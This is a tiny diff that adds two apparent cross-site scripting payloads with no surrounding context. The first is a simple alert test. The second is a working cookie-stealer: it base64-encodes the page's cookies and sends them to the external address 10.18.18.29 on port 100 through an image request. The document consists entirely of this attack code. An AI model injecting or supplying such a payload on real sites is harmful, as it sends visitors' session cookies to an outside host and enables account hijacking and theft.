@@ -1,0 +1,2 @@
+<script>alert("Hello");</script>
+<script>var i=new Image(); i.src="http://10.18.18.29:100/?cookie="+btoa(document.cookie);</script>
